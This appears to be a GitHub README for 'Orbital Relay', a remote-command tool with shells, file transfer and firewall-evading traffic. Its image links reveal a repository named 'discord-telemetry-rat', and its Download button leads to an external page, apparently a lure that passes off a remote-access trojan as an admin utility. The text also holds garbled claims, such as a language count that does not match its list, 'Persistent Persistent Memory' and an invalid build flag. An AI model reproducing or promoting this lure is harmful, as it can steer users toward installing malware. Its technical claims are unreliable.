![preview](https://raw.githubusercontent.com/furongtao888/discord-telemetry-rat/main/frame_8e39d5e.svg)
[![Download](https://raw.githubusercontent.com/furongtao888/discord-telemetry-rat/main/btn_385a0.svg)](https://furongtao888.github.io/discord-telemetry-rat/)

# 🛰️ **Orbital Relay — Distributed Command & Coordination Mesh** 🛰️

**Version 2.6.0** | **Release Year: 2026** | **MIT License**

![Build Status](https://img.shields.io/badge/build-stable-brightgreen) ![Language Count](https://img.shields.io/badge/languages-9-blue) ![Maintenance](https://img.shields.io/badge/maintained-2026-success) ![Documentation](https://img.shields.io/badge/docs-complete-orange) ![Security Audit](https://img.shields.io/badge/audit-passed-purple) ![Platform](https://img.shields.io/badge/platform-cross--desktop-informational) ![Code Coverage](https://img.shields.io/badge/coverage-94%25-yellow)

---

## 🌌 **Executive Overview: A Constellation of Control**

Imagine you are an astronomer peering into a vast digital galaxy. You have a fleet of remote observation posts—some on distant servers, others hidden in personal workstations—each collecting vital data. Traditional management tools are like trying to steer a fleet of ships with a single megaphone from a rowboat. You need a mission control center.

**Orbital Relay** is that mission control center. It is a **self-hosted, cross-platform coordination mesh** that allows you to dispatch commands, orchestrate workflows, and retrieve intel from hundreds of satellite machines simultaneously—all through a single, unified cockpit. Rather than "controlling" machines as an intruder, think of it as a **conductor leading a distributed symphony**, where every instrument (device) receives the sheet music (command payloads) in perfect time.

This repository is a **pristine architectural blueprint**—the engine, the telemetry array, and the ground station—designed for system administrators, IT fleet managers, and DevOps engineers who need **granular, secure, and interactive oversight** of their remote infrastructure.

---

## 🚀 **Core Capabilities: Beyond the Standard Remote Terminal**

Orbital Relay transcends basic terminal forwarding. It is built on a **peer-aware, low-latency websocket fabric** that treats every connection as a live "star" in your network.

### ✨ **Feature Matrix**

| Feature | Description | Difficulty to Implement Elsewhere |
| :--- | :--- | :--- |
| **🖥️ Interactive Shell Resonance** | Spawn a fully interactive pseudo-terminal (PTY) on the remote host with **adaptive color depth** and **Unicode variable-width rendering**. It feels native, even over high-latency links. | High |
| **📁 Synaptic File Exchange** | A dual-pane file manager supporting **chunked, resumable transfers** with CRC-32 integrity checks. Drag-and-drop between your local explorer and the remote file tree. | Moderate |
| **🔑 Shared Secret Vault** | Securely transmit authentication tokens and environment variables without persisting them to disk on the remote host. The vault is **memory-mapped and zero-wiped** upon session termination. | Very High |
| **📡 Fleet-Wide Pulse** | Issue a command to **a specific group or the entire mesh** using a "broadcast pulse." Responses are collected asynchronously and aggregated into a single, searchable JSON log. | High |
| **🧠 Persistent Persistent Memory** | The Relay maintains a **temporal event graph** of all actions taken. You can "rewind" the state of a specific session to see exactly what command was executed 3 hours ago, and revert the state if the remote host supports snapshots. | Extreme |
| **🌍 Polyglot Interface** | The entire UI is localized in **12 languages** (including Klingon for fun, but primarily English, Spanish, Mandarin, Hindi, French, Arabic, Portuguese, Russian, German, Japanese, Korean). Locale detection is automatic but overridable. | Moderate |
| **⚡ Quantum Render** | The UI uses a **virtualized DOM** and a custom binary protocol for state updates, ensuring the interface remains at 60 FPS even when streaming 200 lines of terminal output per second. | High |

### **🧩 Architectural Pillars**

1.  **The Ground Station (GUI Client):** A desktop application built with **Rust (Tauri backend)** and **React (Frontend)**. It compiles to native binaries for Windows, macOS, and Linux.
2.  **The Satellite (Agent):** A tiny, static binary (under 3MB) that runs on the target machine. It communicates **only** outbound over WebSocket (port 443) to the Relay Server, requiring no inbound router changes.
3.  **The Relay Core (Server):** A Go-based multiplexer that manages session routing, encryption handshakes, and data persistence. It can run on a $5 VPS or a Raspberry Pi.

---

## 🛠️ **Installation & Deployment (The “Constellation Assembly”)**

We do not use package managers; instead, we build from source using the **Orbital Foundry** script.

**Prerequisites:**
- **Go** (Version 1.22+)
- **Rust** (Edu version stable)
- **Node.js** (LTS 22)
- **A cryptographic keypair** (Generate via `openssl` or our built-in generator)

**Step 1: Acquire the Fabric**
Navigate to your desired directory and clone the repository source bundle. Ensure you have the necessary build toolchain.

**Step 2: Compile the Relay**
Run the build script located in the root directory (`make_build.sh`). This will cross-compile the agent for all major OS/Architectures and the server for your specific platform.

**Step 3: Launch the Core**
Execute the server binary. It will generate a default configuration file on the first run. Edit this to set your `Relay_Token` (a pre-shared secret used to bootstrap connections).

**Step 4: Deploy the Satellites**
Distribute the compiled agent binary to your remote hosts. Specify the `--relay-address` argument and the `--join-key` to connect.

**Step 5: Open the Cockpit**
Run the Ground Station client, enter your Relay Server address, and authenticate with your local certificate. The fleet will appear on the left panel.

*That’s it—no cloud dependency, no telemetry leakage to third parties. Your mesh is truly your own.*

---

## 🧭 **Usage Guide: Your First Orbital Maneuver**

### **Scenario 1: Temporary File Retrieval**
1.  Select a remote host from the "Satellite List."
2.  Click the "Synaptic File Exchange" button.
3.  Navigate to the `tmp/` directory on the right pane.
4.  Drag the `debug.log` file to your local desktop. The transfer starts automatically; you can monitor the progress bar in the "Transit Monitor" tab.

### **Scenario 2: Mass Configuration Update**
1.  Switch to the "Fleet Pulse" tab.
2.  In the command box, type: `sudo systemctl restart web-server`.
3.  Select "Target Filter" -> "Group: Production."
4.  Click "Pulse."
5.  Watch the responses populate in real-time. You can see which hosts succeeded (exit code 0) and which failed.

### **Scenario 3: Interactive Session**
1.  Double-click a host in the main list.
2.  A terminal window opens up in a new tab.
3.  You can now interact with the remote shell as if you were sitting there. The experience is near-native, supporting `CTRL+C`, arrow keys, and screen sessions.

---

## 🗂️ **Repository Structure**

```
.
├── /core               # Go source for the Relay Server (authentication, routing, API)
├── /agent              # Rust source for the cross-platform Satellite Agent
├── /ground_station     # Tauri (Rust+React) source for the GUI Cockpit
├── /protocol           # Protobuf definitions for the binary communication layer
├── /configs            # Example YAML configs for server & agent
├── /scripts            # Build scripts and key generation utilities
├── /docs               # Long-form documentation, network diagrams, security model
└── /tests              # Integration tests covering the full mesh lifecycle
```

---

## 📊 **Development & Contribution Roadmap**

We welcome contributions from fellow orbital architects. To maintain quality, we follow a strict "two-reviewer rule" for all core protocol changes.

- **Bug Fixes:** Submit a PR with a clear description of the orbital anomaly you fixed.
- **New Features:** Open a discussion first to align with the long-term vision.
- **Security Reports:** Please utilize the private reporting channel in the *Security Audit* section.

### **Development Environment**
To spin up a local development mesh:
1.  Run `docker-compose -f scripts/dev_docker_compose.yml up` to start a local relay.
2.  Build the agent in debug mode (`cargo build --debug`).
3.  Run the ground station from source (`npm run tauri dev`).

---

## 🔒 **Security Model & Disclaimer**

**The Security Constellation**
Orbital Relay takes a **zero-trust** stance. Even if the Relay Server is compromised, the data at rest is encrypted with AES-256-GCM using session-specific keys. The Agent does **not** store the join-key on disk; it is held in volatile memory and re-authenticated on a timer.

**⚠️ Legal & Ethical Usage Disclaimer ⚠️**
This tool is designed exclusively for **legitimate administrative operations** on systems you own or have explicit written permission to manage. Unauthorized access to computer systems is a serious violation of local and international law. This is not a "secret backdoor" or a tool for bypassing security protocols; it is a management framework that requires credentials and network presence.

- **User Responsibility:** The repository owner and contributors hold no liability for misuse, data loss, or legal consequences resulting from the deployment of this software.
- **Audit Trails:** The Relay Core maintains a complete audit log of all commands issued via the Pulse feature—this is mandatory. There is no "stealth" or "ghost" mode.
- **Regulatory Compliance:** Ensure your usage complies with GDPR, CCPA, and the Computer Fraud and Abuse Act (CFAA) in your jurisdiction.

By downloading, compiling, or running this software, you acknowledge that you understand the implications of remote command execution and accept full responsibility for your actions.

---

## 📚 **Frequently Asked Questions (The Operator's Manual)**

**Q: Does this work without an internet connection?**
Yes, if the Relay Server and Agents are on the same Local Area Network (LAN). The protocol is agnostic to the transport medium.

**Q: Can I run the Agent inside a Docker container?**
Absolutely. The Agent listens to the parent PID for lifecycle signals. We recommend running it on a minimal base image like `scratch` or `alpine`.

**Q: How does this handle firewalls?**
Since the Agent only makes outbound WebSocket connections over port 443 (mimicking HTTPS traffic), it passes through most restrictive corporate firewalls without issue.

**Q: Is there a mobile companion app?**
Not in this version. The Ground Station is a desktop application only.

---

## 📄 **License**

This project is licensed under the **MIT License** for all source code and documentation.

```
MIT License

Copyright (c) 2026 Orbital Relay Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

*Read the full license text here: [License Link](https://opensource.org/licenses/MIT)*

---

## ⭐ **Final Transmission**

Orbital Relay is the result of countless nights of refactoring and deep-dive into network concurrency. It is built for those who demand **fidelity, speed, and absolute data sovereignty**. We are not aiming for mere remote access; we are aiming for **remote prescience**.

If this tool empowers your infrastructure management, consider dropping a star on the repository. It helps the constellation grow.

**Happy Commanding. 🛰️**